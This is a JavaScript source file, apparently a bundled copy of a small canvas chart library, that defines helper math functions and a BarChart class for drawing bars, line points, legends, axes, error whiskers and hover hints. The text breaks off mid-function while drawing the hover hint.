/* >>> chartjs (test_v1 bytes) <<< */
(function(){
try{
/*global module:true*/
'use strict';

Math.log2 = Math.log2 || function(x) {
  return Math.log(x) / Math.LN2;
};

Math.log10 = Math.log10 || function(x) {
  return Math.log(x) / Math.LN10;
};

(function() {
  var Helpers = {
    avg: function(arr) {
      var v = 0;
      for (var index = 0; index < arr.length; ++index) {
        v += arr[index];
      }
      return v / arr.length;
    },
    min: function(arr) {
      if (arr.length === 0) return 0;
      var v = arr[0];
      for (var index = 1; index < arr.length; ++index) {
        var v2 = arr[index];
        if (Array.isArray(v2)) v2 = Helpers.avg(v2);
        if (v2 < v) v = v2;
      }
      return Math.max(0, v);
    },
    max: function(arr) {
      var v = 0;
      for (var index = 0; index < arr.length; ++index) {
        var v2 = arr[index];
        if (Array.isArray(v2)) v2 = Helpers.avg(v2);
        if (v2 > v) v = v2;
      }
      return Math.max(0, v);
    },
    upperMax: function(arr) {
      var v = 0;
      for (var index = 0; index < arr.length; ++index) {
        var v2 = arr[index];
        if (Array.isArray(v2)) v2 = Helpers.max(v2);
        if (v2 > v) v = v2;
      }
      return Math.max(0, v);
    },
    lowerMin: function(arr) {
      if (arr.length === 0) return 0;
      var v = arr[0] || Infinity;
      if (Array.isArray(v)) v = Helpers.lowerMin(v);
      for (var index = 1; index < arr.length; ++index) {
        var v2 = arr[index];
        if (v2 == null) continue;
        if (Array.isArray(v2)) v2 = Helpers.lowerMin(v2);
        if (v2 < v) v = v2;
      }
      if (isNaN(v) || !isFinite(v)) v = 0;
      return Math.max(0, v);
    },
    niceNumbers: function(range, round) {
      var exponent = Math.floor(Math.log10(range));
      var fraction = range / Math.pow(10, exponent);
      var niceFraction;
      if (round) {
        if (fraction < 1.5) niceFraction = 1;
        else if (fraction < 3) niceFraction = 2;
        else if (fraction < 7) niceFraction = 5;
        else niceFraction = 10;
      } else {
        if (fraction <= 1.0) niceFraction = 1;
        else if (fraction <= 2) niceFraction = 2;
        else if (fraction <= 5) niceFraction = 5;
        else niceFraction = 10;
      }
      return niceFraction * Math.pow(10, exponent);
    },
    getLinearTicks: function(min, max, maxTicks) {
      var range = Helpers.niceNumbers(max - min, false);
      var tickSpacing = Helpers.niceNumbers(range / (maxTicks - 1), true);
      return [
        Math.floor(min / tickSpacing) * tickSpacing,
        Math.ceil(max / tickSpacing) * tickSpacing,
        tickSpacing
      ];
    },
    getFont: function(options) {
      options.style = options.style || 'normal';
      options.variant = options.variant || 'normal';
      options.weight = options.weight || 'lighter';
      options.size = options.size || '12';
      options.family = options.family || 'Arial';
      return [options.style, options.variant, options.weight, options.size + 'px', options.family].join(' ');
    },
    getAxisRatio: function(min, max, value) {
      return (value - min) / (max - min);
    }
  };

  var BarChart = (function() {
    function BarChart(ctx, options) {
      this.mouseListeners = [];
      this.currentHint = null;
      this.fillRegions = []
      this.options = {
        font: 'Helvetica',
        fontWeight: 'normal',
        fontSizeTitle: 24,
        fontSizeAxes: 20,
        fontSizeTicks: 18,
        fontSizeLabels: 18,
        fontDataTags: 18,
        fontSizeLegend: 18,
        fontSizeHint: 18,
        paddingPercentBars: 0.10,
        paddingPercentTicks: 0.15,
        paddingPixelsVertical: 10,
        paddingPixelsHorizontal: 10,
        paddingPixelsTicks: 10,
        maxWidthBars: 0,
        fillColorBackground: 'rgb(255, 255, 255)',
        strokeColorBars: 'rgb(0, 0, 0)',
        fillColorBars: 'rgba(180, 180, 180, 0.25)',
        scaleStyle: 'linear',
        barStyle: 'none',
        stackedBarPadding: 3,
        defaultMaxTick: 0,
        pixelsLegendSquare: 10,
        radiusDot: 5,
        fillColorLegend: 'rgb(230, 230, 230)',
        tickFormatter: null,
        tickFormatterMeasure: null,
        fillRegion: 'normal'
      };
      options = options || { };
      for (var key in this.options) {
        if (options.hasOwnProperty(key)) this.options[key] = options[key];
      }
      this.ctx = ctx;
      this.content = { };
      this.labelPositions = { }
    }

    BarChart.prototype.update = function(content) {
      if (typeof content !== 'object') {
        throw new Error('Collections must be objects.');
      } else if (!(content.hasOwnProperty('labels') && content.hasOwnProperty('data'))) {
        throw new Error('Collection must specify labels and data.');
      } else if (!(Array.isArray(content.labels) && Array.isArray(content.data))) {
        throw new Error('Labels and data must be arrays.');
      } else if (content.labels.length !== content.data.length) {
        throw new Error('Labels and data length must match.');
      }
      content._data_standard_deviation = [];
      content._data_standard_error = [];
      for (var i = 0; i < content.data.length; ++i) {
        var isArr = Array.isArray(content.data[i]);
        if (this.options.scaleStyle === 'log2') {
          if (isArr) {
            for (var i3 = 0; i3 < content.data[i].length; ++i3) content.data[i][i3] = Math.log2(content.data[i][i3]);
          } else content.data[i] = Math.log2(content.data[i]);
        }
        if (isArr) {
          var mean = Helpers.avg(content.data[i]);
          var acc = 0;
          for (var i2 = 0; i2 < content.data[i].length; ++i2) acc += Math.pow(mean - content.data[i][i2], 2);
          acc = Math.sqrt(acc / (content.data[i].length - 1));
          content._data_standard_deviation.push(acc);
          content._data_standard_error.push(acc / Math.sqrt(content.data[i].length));
        } else {
          content._data_standard_deviation.push(0);
          content._data_standard_error.push(0);
        }
      }
      this.content = content;
      this.redraw();
    };

    BarChart.prototype.redraw = function() {
      setTimeout(function() {
        this._draw();
      }.bind(this), 0);
    };

    BarChart.prototype.mousemove = function(x, y) {
      var res = null;
      for (var index = 0; index < this.mouseListeners.length; ++index) {
        if ((res = this.mouseListeners[index](x, y))) break;
      }
      if (!res || (typeof res) !== 'object' || !res.hasOwnProperty('index') || !res.hasOwnProperty('drawIndex')) {
        if (this.currentHint !== null) {
          this.currentHint = null;
          this.redraw();
        }
        return;
      }
      var ch = this.currentHint;
      if (ch == null || ch.index != res.index || ch.drawIndex != res.drawIndex) {
        this.currentHint = res;
        this.redraw();
      }
    };

    BarChart.prototype._draw = function() {
      var labelPositions = { }
      this.mouseListeners = [];
      this.fillRegions = [];

      var options = this.options;
      var ctx = this.ctx, content = this.content;
      var width = ctx.canvas.width, height = ctx.canvas.height;
      ctx.clearRect(0, 0, width, height);
      ctx.translate(-0.5, -0.5);
      var remainingWidth = width, remainingHeight = height;
      var index;

      if (options.fillColorBackground != null) {
        ctx.save();
        ctx.fillStyle = options.fillColorBackground;
        ctx.fillRect(0, 0, width, height);
        ctx.restore();
      }

      var topYPadding = options.paddingPixelsHorizontal;
      remainingHeight -= options.paddingPixelsHorizontal;
      ctx.fillStyle = 'rgb(0, 0, 0)';
      /* Draw title of bar chart */
      if (content.title != null) {
        ctx.save();
        ctx.font = Helpers.getFont({ weight: options.fontWeight, size: options.fontSizeTitle, family: options.font });
        ctx.textAlign = 'center';
        ctx.fillText(content.title, width / 2, topYPadding + options.fontSizeTitle);
        ctx.restore();
        remainingHeight -= options.fontSizeTitle * 1.25;
        topYPadding += options.fontSizeTitle * 1.25;
      }

      /* Compute required left padding */
      var leftXPadding = options.paddingPixelsVertical;
      remainingWidth  -= options.paddingPixelsVertical;

      var leftXDrawYLabel = null;
      if (content.yAxis != null) {
        leftXDrawYLabel = leftXPadding + options.fontSizeAxes * 0.5;
        remainingWidth -= options.fontSizeAxes * 1.25;
        leftXPadding += options.fontSizeAxes * 1.25;
      }

      ctx.save();
      ctx.font = Helpers.getFont({ weight: options.fontWeight, size: options.fontSizeTicks, family: options.font });
      var maxChartValue, minChartValue;
      if (options.barStyle === 'stacked') {
        maxChartValue = 0;
        minChartValue = Infinity;
        for (var cmIndex = 0; cmIndex < content.data.length; ++cmIndex) {
          var doB;
          if (Array.isArray(doB = content.data[cmIndex])) {
            var tempSum = 0;
            for (var ii2 = 0; ii2 < doB.length; ++ii2) tempSum += doB[ii2];
            maxChartValue = Math.max(maxChartValue, tempSum);
            minChartValue = Math.min(minChartValue, tempSum);
          } else {
            maxChartValue = Math.max(maxChartValue, content.data[cmIndex]);
            minChartValue = Math.min(minChartValue, content.data[cmIndex]);
          }
        }
      } else {
        maxChartValue = Helpers.upperMax(content.data);
        minChartValue = Helpers.lowerMin(content.data);
      }
      if (options.scaleStyle.indexOf('adaptive') === 0) {
        if (options.scaleStyle.indexOf(':') !== -1) {
          var floater = parseFloat(options.scaleStyle.split(/[:]/)[1]);
          minChartValue *= floater;
          maxChartValue *= 1 + (1 - floater) / 2.0;
        }
      } else minChartValue = 0;
      if (options.defaultMaxTick > maxChartValue) maxChartValue = options.defaultMaxTick;
      if (content.bars != null && Array.isArray(content.bars)) {
        for (index = 0; index < content.bars.length; ++index) {
          var cbv = content.bars[index].value;
          if (isNaN(cbv)) continue;
          maxChartValue = Math.max(maxChartValue, cbv);
          minChartValue = Math.min(minChartValue, cbv);
        }
      }
      var maxYAxisTickWidth = options.scaleStyle == 'log2' ? Math.ceil(Math.pow(2, maxChartValue)) : (Math.ceil(maxChartValue) + '.00');
      if (options.tickFormatterMeasure != null) maxYAxisTickWidth = options.tickFormatterMeasure;
      maxYAxisTickWidth = ctx.measureText(maxYAxisTickWidth).width;
      maxYAxisTickWidth = Math.ceil(maxYAxisTickWidth) + options.paddingPixelsTicks;
      remainingWidth -= maxYAxisTickWidth;
      leftXPadding += maxYAxisTickWidth;
      ctx.restore();

      var rightXPadding = options.paddingPixelsVertical;
      remainingWidth -= options.paddingPixelsVertical;

      /* Draw legend */
      if (content.legend != null && Array.isArray(content.legend)) {
        ctx.save();
        ctx.font = Helpers.getFont({ weight: options.fontWeight, size: options.fontSizeLegend, family: options.font });
        var maxLWidth = 0;
        for (var lIndex = 0; lIndex < content.legend.length; ++lIndex) {
          maxLWidth = Math.max(maxLWidth, ctx.measureText(content.legend[lIndex].label).width);
        }
        maxLWidth = Math.ceil(maxLWidth);
        maxLWidth += options.pixelsLegendSquare + 8;
        var legendEntriesPerLine = Math.floor((remainingWidth - options.paddingPixelsHorizontal * 2) / maxLWidth);
        var lLReqHeight = Math.ceil(content.legend.length / legendEntriesPerLine) * options.fontSizeLegend * 1.5;
        remainingHeight -= lLReqHeight;
        bottomYPadding += lLReqHeight;

        ctx.strokeStyle = 'rgb(0, 0, 0)';
        ctx.fillStyle = options.fillColorLegend;
        var bSX, bSY;
        ctx.beginPath();
        ctx.moveTo(bSX = leftXPadding, bSY = topYPadding + remainingHeight);
        ctx.lineTo(bSX + remainingWidth, bSY);
        ctx.lineTo(bSX + remainingWidth, bSY + lLReqHeight);
        ctx.lineTo(bSX, bSY + lLReqHeight);
        ctx.lineTo(bSX, bSY);
        ctx.stroke();
        ctx.fill();

        for (lIndex = 0; lIndex < content.legend.length; ++lIndex) {
          var legLine = Math.floor(lIndex / legendEntriesPerLine);
          var legCol = lIndex % legendEntriesPerLine;
          ctx.fillStyle = content.legend[lIndex].color;
          var boxX = bSX + legCol * maxLWidth + 3, boxY = bSY + legLine * options.fontSizeLegend * 1.5 + options.fontSizeLegend * 0.5;
          ctx.beginPath();
          ctx.moveTo(boxX, boxY);
          ctx.lineTo(boxX + options.pixelsLegendSquare, boxY);
          ctx.lineTo(boxX + options.pixelsLegendSquare, boxY + options.pixelsLegendSquare);
          ctx.lineTo(boxX, boxY + options.pixelsLegendSquare);
          ctx.lineTo(boxX, boxY);
          ctx.fill();
          ctx.stroke();

          ctx.textAlign = 'left';
          ctx.fillStyle = 'rgb(0, 0, 0)';
          ctx.fillText(content.legend[lIndex].label, boxX + 3 + options.pixelsLegendSquare, boxY + options.fontSizeLegend * 0.5);
        }

        ctx.restore();
      }

      /* Draw x-axis label of bar chart */
      var bottomYPadding = options.paddingPixelsHorizontal;
      remainingHeight -= options.paddingPixelsHorizontal;
      if (content.xAxis != null) {
        ctx.save();
        ctx.font = Helpers.getFont({ weight: options.fontWeight, size: options.fontSizeAxes, family: options.font });
        ctx.fillStyle = 'rgb(0, 0, 0)';
        ctx.textAlign = 'center';
        ctx.fillText(content.xAxis, (width - remainingWidth) + remainingWidth / 2, topYPadding + remainingHeight - bottomYPadding);
        remainingHeight -= options.fontSizeAxes * 1.5;
        bottomYPadding += options.fontSizeAxes * 1.5;
        ctx.restore();
      }

      var widthPerBar = remainingWidth / content.data.length;

      /* Draw x-axis top labels */
      if (content.topLabels != null) {
        ctx.save();
        ctx.textAlign = 'center';
        ctx.font = Helpers.getFont({ weight: options.fontWeight, size: options.fontSizeLabels, family: options.font });
        remainingHeight -= options.fontSizeLabels * 1.5;
        topYPadding += options.fontSizeLabels * 1.5;
        for (index = 0; index < content.topLabels.length; ++index) {
          ctx.fillText(
            content.topLabels[index],
            leftXPadding + index * widthPerBar + widthPerBar / 2,
            topYPadding - options.fontSizeLabels / 2
          );
        }
        ctx.restore();
      }

      /* Draw x-axis labels */
      ctx.save();
      var reqWidth = 0;
      if (content.dataTags != null) {
        ctx.font = Helpers.getFont({ weight: options.fontWeight, size: options.fontDataTags, family: options.font });
        var dataTags = content.dataTags;
        for (index = 0; index < dataTags.length; ++index) {
          if (Array.isArray(dataTags[index])) {
            for (var index2 = 0; index2 < dataTags[index].length; ++index2) {
              reqWidth = Math.max(reqWidth, Math.ceil(ctx.measureText(dataTags[index][index2]).width + 5));
            }
          } else {
            reqWidth = Math.max(reqWidth, Math.ceil(ctx.measureText(dataTags[index]).width + 5));
          }
        }
      }

      ctx.font = Helpers.getFont({ weight: options.fontWeight, size: options.fontSizeLabels, family: options.font });
      var computedBarPadding = Math.floor((widthPerBar * options.paddingPercentBars) / 2);
      var wwh = widthPerBar - computedBarPadding * 2;
      if (wwh < reqWidth) {
        computedBarPadding -= Math.ceil((reqWidth - wwh) / 2);
        computedBarPadding = Math.max(0, computedBarPadding);
      } else if (options.maxWidthBars > 0 && wwh > options.maxWidthBars) {
        computedBarPadding = Math.floor((widthPerBar - options.maxWidthBars) / 2);
      }
      var maxTextWidth = 0, maxTextStackSize = 1;
      for (index = 0; index < content.labels.length; ++index) {
        var tLabel = content.labels[index];
        if (Array.isArray(tLabel)) {
          maxTextStackSize = Math.max(maxTextStackSize, tLabel.length);
          for (index2 = 0; index2 < tLabel.length; ++index2) {
            maxTextWidth = Math.max(maxTextWidth, ctx.measureText(tLabel[index2]).width);
          }
        } else maxTextWidth = Math.max(maxTextWidth, ctx.measureText(tLabel).width);
      }
      var xLabelsRotated = false;
      if (maxTextWidth > widthPerBar - computedBarPadding) {
        ctx.textAlign = 'right';
        ctx.rotate(Math.PI * 1.5);
        xLabelsRotated = true;
      } else {
        ctx.textAlign = 'center';
      }
      var lastLabelY = -options.fontSizeLabels;
      for (index = 0; index < content.labels.length; ++index) {
        var cLabel = content.labels[index];
        var x = leftXPadding + index * widthPerBar + widthPerBar / 2, y = topYPadding + remainingHeight - options.fontSizeLabels / 2;
        if (xLabelsRotated) {
          y = topYPadding + remainingHeight - maxTextWidth + 5;
          y = [x, x = -y][0];

          if (y < lastLabelY + options.fontSizeLabels) continue;
          lastLabelY = y;
        }
        var yUp = options.fontSizeLabels * (maxTextStackSize - 1);
        if (Array.isArray(cLabel)) {
          if (xLabelsRotated) {
            yUp = options.fontSizeLabels * (cLabel.length - 1.5);
            yUp /= 2;
          }
          for (index2 = 0; index2 < cLabel.length; ++index2) {
            ctx.fillText(cLabel[index2], x, y - yUp);
            yUp -= options.fontSizeLabels;
          }
        } else {
          if (xLabelsRotated) yUp = -options.fontSizeLabels * 0.25;
          ctx.fillText(cLabel, x, y - yUp);
        }
      }
      if (xLabelsRotated) {
        remainingHeight -= maxTextWidth + 5;
        bottomYPadding += maxTextWidth + 5;
      } else {
        var remVal = options.fontSizeLabels * maxTextStackSize;
        remVal += options.fontSizeLabels * 0.5;
        remainingHeight -= remVal;
        bottomYPadding += remVal;
      }
      ctx.restore();

      /* Draw boundaries */
      var boundX1 = leftXPadding, boundX2 = leftXPadding + remainingWidth;
      var boundY1 = topYPadding, boundY2 = topYPadding + remainingHeight;

      for (index = 0; index < content.labels.length; ++index) labelPositions[index] = {
        xStart: leftXPadding + index * widthPerBar,
        xEnd: leftXPadding + (1 + index) * widthPerBar,
        yStart: boundY1, yEnd: boundY2
      }

      ctx.save();
      ctx.strokeStyle = 'rgb(0, 0, 0)';
      ctx.beginPath();
      if (content.topLabels != null) {
        ctx.moveTo(boundX2, boundY1);
        ctx.lineTo(boundX1, boundY1);
      } else {
        ctx.moveTo(boundX1, boundY1);
      }
      ctx.lineTo(boundX1, boundY2);
      ctx.lineTo(boundX2, boundY2);
      if (content.topLabels != null) ctx.lineTo(leftXPadding + remainingWidth, topYPadding);
      ctx.stroke();
      ctx.restore();

      /* Draw top label */
      if (content.topLabel != null) {
        ctx.save();
        ctx.textAlign = 'right';
        ctx.font = Helpers.getFont({ weight: options.fontWeight, size: options.fontSizeLabels, family: options.font });
        ctx.fillText(content.topLabel, leftXPadding - 3, topYPadding - options.fontSizeLabels / 2);
        ctx.restore();
      }

      /* Draw y-axis label of bar chart */
      if (content.yAxis != null) {
        ctx.save();
        ctx.rotate(Math.PI * 1.5);
        ctx.font = Helpers.getFont({ weight: options.fontWeight, size: options.fontSizeAxes, family: options.font });
        ctx.fillStyle = 'rgb(0, 0, 0)';
        ctx.textAlign = 'center';
        ctx.fillText(content.yAxis, -(topYPadding + remainingHeight / 2), leftXDrawYLabel);
        ctx.restore();
      }

      /* Draw y-axis labels */
      ctx.save();
      ctx.fillStyle = 'rgb(0, 0, 0)';
      ctx.strokeStyle = 'rgba(0, 0, 0, 0.20)';
      ctx.font = Helpers.getFont({ weight: options.fontWeight, size: options.fontSizeTicks, family: options.font });
      ctx.textAlign = 'right';
      var tickMeta = Helpers.getLinearTicks(0, maxChartValue, Math.max(2, remainingHeight / (options.fontSizeTicks * (1 + options.paddingPercentTicks))));
      var alpha = maxChartValue / options.fontSizeTicks;
      maxChartValue = tickMeta[1];
      if (maxChartValue > 1) maxChartValue += Math.ceil(alpha);
      else maxChartValue += alpha;
      var ticks = [];
      while (tickMeta[0] <= tickMeta[1]) {
        ticks.push(tickMeta[0]);
        tickMeta[0] += tickMeta[2];
      }
      for (index = 0; index < ticks.length; ++index) {
        var tickHeight = Math.round(remainingHeight * Helpers.getAxisRatio(minChartValue, maxChartValue, ticks[index]));
        if (tickHeight < 0) continue;
        if (options.scaleStyle == 'log2' && ticks[index] !== 0) ticks[index] = Math.round(Math.pow(2, ticks[index]));
        else ticks[index] = Math.floor(ticks[index] * 100) / 100;
        if (options.tickFormatter != null && typeof options.tickFormatter === 'function') {
          ctx.fillText(options.tickFormatter(ticks[index]).toString(), leftXPadding - options.paddingPixelsTicks, topYPadding + remainingHeight - tickHeight);
        } else {
          ctx.fillText(ticks[index].toString(), leftXPadding - options.paddingPixelsTicks, topYPadding + remainingHeight - tickHeight);
        }
        if (index == 0) continue;
        ctx.beginPath();
        ctx.moveTo(leftXPadding, topYPadding + remainingHeight - tickHeight);
        ctx.lineTo(leftXPadding + remainingWidth, topYPadding + remainingHeight - tickHeight);
        ctx.stroke();
      }
      ctx.restore();

      if (content.bars != null && Array.isArray(content.bars)) {
        ctx.save();
        for (index = 0; index < content.bars.length; ++index) {
          var cBar = content.bars[index];
          if (cBar.value > maxChartValue) continue;
          var renderBarY = topYPadding + remainingHeight - Math.round(remainingHeight * Helpers.getAxisRatio(minChartValue, maxChartValue, cBar.value));
          ctx.strokeStyle = cBar.style;
          ctx.fillStyle = cBar.style;
          ctx.beginPath();
          ctx.moveTo(boundX1, renderBarY);
          ctx.lineTo(boundX2, renderBarY);
          ctx.stroke();
          ctx.fill();
        }
        ctx.restore();
      }

      /* Draw bars */
      ctx.save();
      var lastData = null;
      for (index = 0; index < content.data.length; ++index) {
        var fillColorForIndex = null;
        var strokeColorForIndex = null;
        if (content.fillColor != null) {
          if (Array.isArray(content.fillColor)) fillColorForIndex = ctx.fillStyle = content.fillColor[index];
          else ctx.fillStyle = content.fillColor;
        } else ctx.fillStyle = options.fillColorBars;
        if (content.strokeColor != null) {
          if (Array.isArray(content.strokeColor)) strokeColorForIndex = ctx.strokeStyle = content.strokeColor[index];
          else ctx.strokeStyle = content.strokeColor;
        } else ctx.strokeStyle = options.strokeColorBars;
        var v = content.data[index];
        var vIsArr = Array.isArray(v);
        var renderStartX = leftXPadding + widthPerBar * index;
        if (vIsArr && options.barStyle === 'stacked') {
          var runningValue = 0, lastHeight = 0;
          for (var drawIndex = 0; drawIndex < v.length; ++drawIndex) {
            if (fillColorForIndex != null && Array.isArray(fillColorForIndex)) {
              ctx.fillStyle = fillColorForIndex[drawIndex] || options.fillColorBars;
            }
            if (strokeColorForIndex != null && Array.isArray(strokeColorForIndex)) {
              ctx.strokeStyle = strokeColorForIndex[drawIndex] || options.strokeColorBars;
            }

            runningValue += v[drawIndex];
            var renderBarHeight = Math.floor(remainingHeight * Helpers.getAxisRatio(minChartValue, maxChartValue, runningValue));
            var renderUpToY = topYPadding + remainingHeight - renderBarHeight;
            if (Math.abs(renderBarHeight - lastHeight) < options.stackedBarPadding + 2) {
              lastHeight = renderBarHeight;
              continue;
            }

            var barPadP = drawIndex > 0 ? options.stackedBarPadding : 0;
            var tSX, tSY;
            var tEX, tEY;
            ctx.beginPath();
            ctx.moveTo(tSX = renderStartX + computedBarPadding, tSY = topYPadding + remainingHeight - lastHeight - barPadP);
            ctx.lineTo(renderStartX + computedBarPadding, renderUpToY);
            ctx.lineTo(tEX = renderStartX + (widthPerBar - 1) - computedBarPadding, tEY = renderUpToY);
            ctx.lineTo(renderStartX + (widthPerBar - 1) - computedBarPadding, topYPadding + remainingHeight - lastHeight - barPadP);
            if (drawIndex > 0) ctx.lineTo(tSX, tSY);
            ctx.stroke();
            ctx.fill();
            var hint;
            if (content.hints != null && content.hints[index] != null && (hint = content.hints[index][drawIndex]) != null) {
              this.mouseListeners.push(function(index, drawIndex, hint, sx, sy, ex, ey, x, y) {
                var minX = Math.min(sx, ex), maxX = Math.max(sx, ex);
                var minY = Math.min(sy, ey), maxY = Math.max(sy, ey);
                if (x < minX || x > maxX || y < minY || y > maxY) return null;
                return { index: index, drawIndex: drawIndex, rect: { left: minX, right: maxX, top: minY, bottom: maxY }, text: hint.split('\n') };
              }.bind(this, index, drawIndex, hint, tSX, tSY, tEX, tEY));
            }

            var tagText;
            if (tSY - renderUpToY > options.fontDataTags * 1.25 && content.dataTags != null && (tagText = content.dataTags[index]) != null && (tagText = tagText[drawIndex]) != null) {
              var oFS = ctx.fillStyle;
              ctx.fillStyle = 'rgb(0, 0, 0)';
              ctx.font = Helpers.getFont({ weight: options.fontWeight, size: options.fontDataTags, family: options.font });
              ctx.textAlign = 'center';
              ctx.fillText(tagText, renderStartX + widthPerBar / 2, tSY - options.fontDataTags * 0.25);
              ctx.fillStyle = oFS;
            }

            lastHeight = renderBarHeight;
          }

          if (content.barTooltips != null) {
            ctx.fillStyle = 'rgb(0, 0, 0)';
            ctx.font = Helpers.getFont({ weight: options.fontWeight, size: options.fontSizeLabels, family: options.font });
            ctx.textAlign = 'center';
            ctx.fillText(content.barTooltips[index] || '', renderStartX + widthPerBar / 2, renderUpToY - 3);
          }
        } else if (options.barStyle === 'line') {
          if (vIsArr) {
            var rbx = renderStartX + widthPerBar / 2;

            var lDu;
            if (options.fillRegion === 'background') {
              lDu = lastData;
              if (Array.isArray(lDu)) lDu = lDu[0];
              if (lDu != null) {
                var sFS = ctx.fillStyle
                ctx.fillStyle = lDu.color
                ctx.fillRect(lDu.x, boundY1, rbx - lDu.x, boundY2 - boundY1)
                ctx.fillStyle = sFS
              }
            }

            var nLData = [];
            for (var drawIndex = 0; drawIndex < v.length; ++drawIndex) {
              var renderBarHeight3 = Math.round(remainingHeight * Helpers.getAxisRatio(minChartValue, maxChartValue, v[drawIndex]));
              var renderUpToY3 = topYPadding + remainingHeight - renderBarHeight3;

              var rby = renderUpToY3;
              if (lastData != null) {
                var tLX, tLY;
                if (Array.isArray(lastData)) {
                  tLX = (lastData[drawIndex] || { }).x;
                  tLY = (lastData[drawIndex] || { }).y;
                } else {
                  tLX = lastData.x;
                  tLY = lastData.y;
                }

                if (tLX && tLY) {
                  if (Array.isArray(strokeColorForIndex)) {
                    ctx.strokeStyle = strokeColorForIndex[drawIndex] || options.strokeColorBars;
                  } else ctx.strokeStyle = strokeColorForIndex || 'rgb(0, 0, 0)';
                  ctx.beginPath();
                  ctx.moveTo(tLX, tLY);
                  ctx.lineTo(rbx, rby);
                  ctx.stroke();
                }
              }

              if (Array.isArray(fillColorForIndex)) {
                ctx.fillStyle = fillColorForIndex[drawIndex] || options.fillColorBars;
              }
              if (Array.isArray(strokeColorForIndex)) {
                ctx.strokeStyle = strokeColorForIndex[drawIndex] || options.strokeColorBars;
              }

              ctx.beginPath();
              ctx.arc(rbx, rby, options.radiusDot, 0, 2 * Math.PI);
              ctx.stroke();
              ctx.fill();

              nLData[drawIndex] = { x: rbx, y: rby, color: ctx.fillStyle };
            }
            lastData = nLData;
            if (lDu != null && lDu.color != lastData[0].color) this.fillRegions.push({
              x: lastData[0].x,
              y: lastData[0].y,
              prev: lDu.color,
              next: lastData[0].color
            })

            if (content.balls != null && Array.isArray(content.balls) && index < content.balls.length) {
              var ball = content.balls[index]
              if (ball != null) {
                ctx.beginPath();
                ctx.fillStyle = ball.fill;
                ctx.strokeStyle = ball.stroke;
                ctx.arc(rbx, topYPadding + remainingHeight - (remainingHeight * Helpers.getAxisRatio(minChartValue, maxChartValue, minChartValue + ball.value)), ball.radius, 0, 2 * Math.PI);
                ctx.stroke();
                ctx.fill();
              }
            }
          } else {
            var renderBarHeight3 = Math.round(remainingHeight * Helpers.getAxisRatio(minChartValue, maxChartValue, v));
            var renderUpToY3 = topYPadding + remainingHeight - renderBarHeight3;

            var rbx = renderStartX + widthPerBar / 2, rby = renderUpToY3;
            var lDu;
            if (options.fillRegion === 'background') {
              if (lastData != null) {
                lDu = lastData;
                if (Array.isArray(lDu)) lDu = lDu[0];
                var sFS = ctx.fillStyle
                ctx.fillStyle = lDu.color
                ctx.fillRect(lDu.x, boundY1, rbx - lDu.x, boundY2 - boundY1)
                ctx.fillStyle = sFS
              }
            }
            ctx.beginPath();
            ctx.arc(rbx, rby, options.radiusDot, 0, 2 * Math.PI);
            ctx.stroke();
            ctx.fill();

            if (lastData != null) {
              if (Array.isArray(lastData)) {
                var tLX, tLY;
                for (var key in lastData) {
                  if (!lastData.hasOwnProperty(key)) continue;
                  tLX = lastData[key].x;
                  tLY = lastData[key].y;
                  if (tLX && tLY) {
                    ctx.strokeStyle = strokeColorForIndex || 'rgb(0, 0, 0)';
                    ctx.beginPath();
                    ctx.moveTo(tLX, tLY);
                    ctx.lineTo(rbx, rby);
                    ctx.stroke();
                  }
                }
              } else {
                var tLX = lastData.x, tLY = lastData.y;
                if (tLX && tLY) {
                  ctx.strokeStyle = strokeColorForIndex || 'rgb(0, 0, 0)';
                  ctx.beginPath();
                  ctx.moveTo(tLX, tLY);
                  ctx.lineTo(rbx, rby);
                  ctx.stroke();
                }
              }
            }

            lastData = { x: rbx, y: rby, color: ctx.fillStyle };
            if (lDu != null && lDu.color != lastData.color) this.fillRegions.push({
              x: lastData.x,
              y: lastData.y,
              prev: lDu.color,
              next: lastData.color
            })

            if (content.balls != null && Array.isArray(content.balls) && index < content.balls.length) {
              var ball = content.balls[index]
              if (ball != null) {
                ctx.beginPath();
                ctx.fillStyle = ball.fill;
                ctx.strokeStyle = ball.stroke;
                ctx.arc(rbx, topYPadding + remainingHeight - (remainingHeight * Helpers.getAxisRatio(minChartValue, maxChartValue, minChartValue + ball.value)), ball.radius, 0, 2 * Math.PI);
                ctx.stroke();
                ctx.fill();
              }
            }
          }

          var hint;
          if (content.hints != null && (hint = content.hints[index]) != null) {
            this.mouseListeners.push(function(index, hint, sx, sy, ex, ey, x, y) {
              var minX = Math.min(sx, ex), maxX = Math.max(sx, ex);
              var minY = Math.min(sy, ey), maxY = Math.max(sy, ey);
              if (x < minX || x > maxX || y < minY || y > maxY) return null;
              return { index: index, drawIndex: drawIndex, rect: { left: minX, right: maxX, top: minY, bottom: maxY }, text: hint.split('\n') };
            }.bind(this, index, hint, rbx - 1, topYPadding, rbx + 1, topYPadding + remainingHeight));
          }
        } else {
          if (vIsArr) v = Helpers.avg(v);
          var renderBarHeight2 = Math.round(remainingHeight * Helpers.getAxisRatio(minChartValue, maxChartValue, v));
          var renderUpToY2 = topYPadding + remainingHeight - renderBarHeight2;
          ctx.beginPath();
          ctx.moveTo(renderStartX + computedBarPadding, topYPadding + remainingHeight);
          ctx.lineTo(renderStartX + computedBarPadding, renderUpToY2);
          ctx.lineTo(renderStartX + (widthPerBar - 1) - computedBarPadding, renderUpToY2);
          ctx.lineTo(renderStartX + (widthPerBar - 1) - computedBarPadding, topYPadding + remainingHeight);
          ctx.stroke();
          ctx.fill();

          if (options.barStyle === 'error') {
            var val;
            if ((val = content._data_standard_error[index]) != 0) {
              var renderBarError = Math.round(remainingHeight * Helpers.getAxisRatio(minChartValue, maxChartValue, val));
              ctx.beginPath();
              var wiskerWidth = Math.round((widthPerBar - computedBarPadding * 2) / 8);
              var x_ = leftXPadding + widthPerBar * index + widthPerBar / 2;
              ctx.moveTo(x_ - wiskerWidth, renderUpToY2 + renderBarError);
              ctx.lineTo(x_ + wiskerWidth, renderUpToY2 + renderBarError);
              ctx.moveTo(x_, renderUpToY2 + renderBarError);
              ctx.lineTo(x_, renderUpToY2 - renderBarError);
              ctx.moveTo(x_ - wiskerWidth, renderUpToY2 - renderBarError);
              ctx.lineTo(x_ + wiskerWidth, renderUpToY2 - renderBarError);
              ctx.stroke();
            }
          }

          if (content.barTooltips != null) {
            ctx.fillStyle = 'rgb(0, 0, 0)';
            ctx.font = Helpers.getFont({ weight: options.fontWeight, size: options.fontSizeLabels, family: options.font });
            ctx.textAlign = 'center';
            ctx.fillText(content.barTooltips[index] || '', renderStartX + widthPerBar / 2, renderUpToY2 - 3);
          }
        }
      }
      ctx.restore();

      if (this.currentHint != null) {
        ctx.save();
